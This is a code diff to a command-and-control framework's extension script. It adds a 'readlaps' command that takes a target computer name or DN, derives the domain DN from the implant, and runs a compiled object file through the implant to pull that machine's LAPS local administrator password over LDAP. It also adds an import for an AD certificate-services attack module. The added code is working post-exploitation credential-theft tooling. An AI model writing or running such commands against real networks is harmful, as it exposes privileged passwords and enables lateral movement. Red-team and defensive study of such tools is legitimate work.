@@ -83,7 +83,6 @@ cmd_ldapsearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 var _cmd_ldapq_computers = ax.create_command("computers", "Get list of computers from ldap", "ldapq computers");
 _cmd_ldapq_computers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-
     let hook = function (task)
     {
         var blocks = task.text.split("--------------------");
@@ -137,11 +136,81 @@ var cmd_ldapq = ax.create_command("ldapq", "Ldap query objects", "ldapq computer
 cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);
 
 
+/// ReadLAPS
+
+var cmd_readlaps = ax.create_command("readlaps", "Read LAPS password for a computer", "readlaps -dc dc01.domain.local -target WINCLIENT");
+cmd_readlaps.addArgFlagString("-dc", "dc", "Target domain controller (e.g., 'dc01.domain.local'). Hostname preferred over IP for LDAP.", "");
+cmd_readlaps.addArgFlagString("-dn", "dn", "Root DN (e.g., 'DC=domain,DC=local'). If not specified, derived from agent domain.", "");
+cmd_readlaps.addArgFlagString("-target", "target", "Target computer sAMAccountName (e.g., 'WINCLIENT$')", "");
+cmd_readlaps.addArgFlagString("-target-dn", "target_dn", "Target computer Distinguished Name (e.g., 'CN=WINCLIENT,OU=Computers,DC=domain,DC=local')", "");
+cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let dc        = parsed_json["dc"];
+    let dn        = parsed_json["dn"];
+    let target    = parsed_json["target"];
+    let target_dn = parsed_json["target_dn"];
+
+    if (!target && !target_dn) {
+        throw new Error("Error: Either -target (sAMAccountName) or -target-dn (Distinguished Name) must be specified");
+        return;
+    }
+
+    if (target && target_dn) {
+        throw new Error("Error: Cannot specify both -target and -target-dn");
+        return;
+    }
+
+    // If -dn not specified, derive from agent domain
+    if (!dn || dn === "") {
+        let domain = ax.agent_info(id, "domain")
+        if (domain) {
+            let parts = domain.split(".");
+            dn = parts.map(part => "DC=" + part).join(",");
+        } else {
+            throw new Error("Could not auto-detect DN. Agent domain not available. Please specify -dn manually.");
+            return;
+        }
+    }
+
+    // Strip quotes from target values if present
+    if (dc) {
+        dc = dc.replace(/^['"]|['"]$/g, '');
+    }
+    if (target) {
+        target = target.replace(/^['"]|['"]$/g, '');
+    }
+    if (target_dn) {
+        target_dn = target_dn.replace(/^['"]|['"]$/g, '');
+    }
+
+    // Build the LDAP search filter
+    let searchFilter = "";
+    let message = "";
+    if (target) {
+        // Ensure target ends with $ for computer accounts if not already present
+        let computerName = target;
+        if (!computerName.endsWith("$")) {
+            computerName = computerName + "$";
+        }
+        searchFilter = "(&(objectClass=computer)(sAMAccountName=" + computerName + "))";
+        message = `Read LAPS password for ${computerName}`;
+    } else {
+        searchFilter = "(&(objectClass=computer)(distinguishedName=" + target_dn + "))";
+        message = `Read LAPS password for ${target_dn}`;
+    }
+
+    let bof_params = ax.bof_pack("cstr,cstr,cstr", [dc, dn, searchFilter]);
+    let bof_path = ax.script_dir() + "_bin/readlaps." + ax.arch(id) + ".o";
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
 
 var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_ldapsearch, cmd_ldapq]);
 ax.register_commands_group(group_exec, ["beacon", "gopher", "kharon"], ["windows"], []);
 
 
 
+ax.script_import(ax.script_dir() + "ADCS-BOF/ADCS.axs")
 ax.script_import(ax.script_dir() + "Kerbeus-BOF/kerbeus.axs")
 ax.script_import(ax.script_dir() + "SQL-BOF/SQL.axs")
